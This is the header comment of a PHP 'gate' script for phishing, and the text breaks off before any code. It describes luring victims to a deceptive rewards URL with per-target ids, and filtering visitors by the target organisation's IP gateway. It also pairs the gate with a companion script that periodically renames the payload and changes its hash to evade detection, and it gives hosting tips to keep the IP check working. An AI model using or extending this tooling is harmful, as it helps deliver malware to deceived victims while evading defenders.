<?php
/* 
PHP gate version 1.0

Use case: Phish users with the gate URI example https://rewardspointsforyou[.]com/Rewarded.php?id=CompanyName_or_UserName
Note: if you are using usernames, consider only checking for id presence and not the string "test".  Alternatively, you could feed this a list of valid strings.

Consider using the script "payload_changer.py" from the same repo with this gate. 
It changes the value of payloadinitialized with your payload and changes it on a timed basis.  
The payload will have the name changed and the hash modified by the insertion of an html comment every X number of seconds.

IMPORTANT NOTE!!! If you are hosting this on a server using CloudFlare DNS, make sure you turn off Traffic Routing!!!  
If you do not, the IP check will fail since all traffic will be from a CloudFlare source IP and not your target organizations Gateway !!!!!!!!!!!!!!!!!!!!!
